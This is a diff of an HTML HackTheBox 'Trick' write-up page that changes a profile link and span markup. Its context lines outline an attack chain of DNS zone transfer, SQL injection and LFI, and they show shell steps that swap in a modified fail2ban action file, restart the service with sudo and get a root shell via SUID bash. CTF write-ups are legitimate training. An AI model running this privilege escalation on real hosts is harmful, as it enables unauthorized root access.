@@ -72,7 +72,7 @@
 <!--Machine Overview-->
 			<div class="subtitle">Trick Overview</div>
 			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Trick" rel="noreferrer noopener" target="_blank">Trick</a> machine on HackTheBox, submitted by 
-			<a href="https://app.hackthebox.com/users/36994" rel="noreferrer noopener" target="_blank">Geiseric</a>. The machine starts from a web server running nginx,
+			<a href="https://app.hackthebox.com/users/184611" rel="noreferrer noopener" target="_blank">Geiseric</a>. The machine starts from a web server running nginx,
 			eventually leading to <a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/" rel="noreferrer noopener" target="_blank">Domain Zone Transfer attack via AXFR</a>, exposing a new domain vulnerable to <a href="https://portswigger.net/web-security/sql-injection" rel="noreferrer noopener" target="_blank">SQL injection</a>.
 			From which configuration files can be enumerated which eventually lead to LFI and gain access via ssh, and finally abusing sudoers <a href="https://oklencodes.gitbook.io/untitled/ctfs/biteme-ctf/fail2ban-privilege-escalation" rel="noreferrer noopener" target="_blank">fail2ban</a> privileges.
 
@@ -236,7 +236,7 @@ User michael may run the following commands on trick:
 
             <p class="head-img">Once we place our new iptables-multiport.conf with our code to modify bash, the only thing left to do is restart the service and force ban to get the privileged shell</spa>
         <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="k">michael@trick:~$</span> cd /tmp/
+<span class="ld"><span class="k">michael@trick:~$</span> cd /tmp/
 <span class="k">michael@trick:/tmp$</span> mkdir pwn
 <span class="k">michael@trick:/tmp$</span> cd !$
 <span class="k">michael@trick:/tmp/pwn$</span> cp /etc/fail2ban/action.d/iptables-multiport.conf ./
@@ -264,7 +264,7 @@ rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multipo
 
             <p class="head-img">Let's restart the service</p>
         <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="k">michael@trick:/tmp/pwn$</span> sudo /etc/init.d/fail2ban restart
+<span class="ld"><span class="k">michael@trick:/tmp/pwn$</span> sudo /etc/init.d/fail2ban restart
 <span class="na">[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.</span>
 <span class="k">michael@trick:/tmp/pwn$</span>
 </span> </code></pre></div></div>
@@ -281,7 +281,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-29 03:29:
 
             <p class="head-img">And about a minute later, we are root.</p>
         <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="k">michael@trick:/tmp/pwn$</span> ls -l /bin/bash
+<span class="ld"><span class="k">michael@trick:/tmp/pwn$</span> ls -l /bin/bash
 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 <span class="gd">/bin/bash</span>
 <span class="k">michael@trick:/tmp/pwn$</span> bash -p
 bash-5.0# id
